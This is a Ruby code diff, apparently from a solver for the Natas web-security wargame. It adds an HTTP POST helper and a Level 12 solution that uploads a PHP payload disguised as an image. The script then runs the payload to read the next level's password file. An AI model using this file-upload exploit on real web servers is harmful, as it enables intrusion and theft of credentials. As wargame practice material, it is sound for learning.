@@ -81,6 +81,23 @@ class NatasLevelBase
     response
   end
 
+  def post(query, headers = {}, data = nil, multipart: false)
+    request = Net::HTTP::Post.new(query, headers)
+    request.basic_auth(@login, @password)
+    unless data.nil?
+      request.set_form(
+        data,
+        multipart ? 'multipart/form-data' : 'application/x-www-form-urlencoded'
+      )
+    end
+
+    response = @client.request(request)
+
+    raise StandardError, 'Unauthorized' if response.instance_of?(Net::HTTPUnauthorized)
+
+    response
+  end
+
   private
 
   def log(message)
@@ -382,6 +399,24 @@ end
 # Level 12
 class NatasLevel12 < NatasLevelBase
   LEVEL = 12
+  PAGE = '/'
+  PAYLOAD = %[<? echo(file_get_contents('#{WEBPASS}/natas13')); ?>]
+
+  def exec
+    data = [
+      ['filename', 'file.php'],
+      ['uploadedfile', PAYLOAD, { filename: 'uploadedfile' }]
+    ]
+    log('Uploading file')
+    data = post(PAGE, {}, data, multipart: true).body
+    match = %r{The file <a href="(upload/\w+.php)">}.match(data)
+    file = "/#{match[1]}"
+    log("Getting file #{file}")
+    data = get(file).body
+    match = /(\w{32})/.match(data)
+    not_found unless match
+    found(match[1])
+  end
 end
 
 ##
